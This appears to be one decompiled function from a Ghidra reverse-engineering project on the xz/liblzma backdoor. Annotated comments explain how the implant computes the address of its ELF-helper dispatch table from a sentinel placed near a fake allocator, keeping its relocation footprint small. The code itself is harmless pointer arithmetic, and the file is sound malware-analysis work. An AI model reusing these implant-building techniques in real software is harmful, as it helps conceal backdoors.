// /home/kali/xzre-ghidra/xzregh/1024F0_get_elf_functions_address.c
// Function: get_elf_functions_address @ 0x1024F0
// Calling convention: __stdcall
// Prototype: elf_functions_t * __stdcall get_elf_functions_address(void)


/*
 * AutoDoc: Same pattern for the `elf_functions_t` dispatch table: start from the relocation-safe sentinel (`elf_functions_offset` lives near `fake_lzma_allocator_offset` in `.data`) and advance 12 struct slots to arrive at the live table. The convoluted pointer math lets the object carry offsets instead of absolute addresses, which keeps the relocation surface tiny while still giving the loader a stable way to reach its helper vtable.
 */

#include "xzre_types.h"

elf_functions_t * get_elf_functions_address(void)

{
  uint slot_idx;
  elf_functions_t *table_cursor;
  
  // AutoDoc: Start from the relocation-safe sentinel that ships next to the fake allocator blob so the pointer stays valid pre-patch.
  table_cursor = (elf_functions_t *)fake_lzma_allocator_offset;
  // AutoDoc: Advance 12 struct slots (~0x160 bytes) to land on the live dispatch table populated by the loader.
  for (slot_idx = 0; slot_idx < 0xc; slot_idx = slot_idx + 1) {
    table_cursor = table_cursor + 1;
  }
  return table_cursor;
}

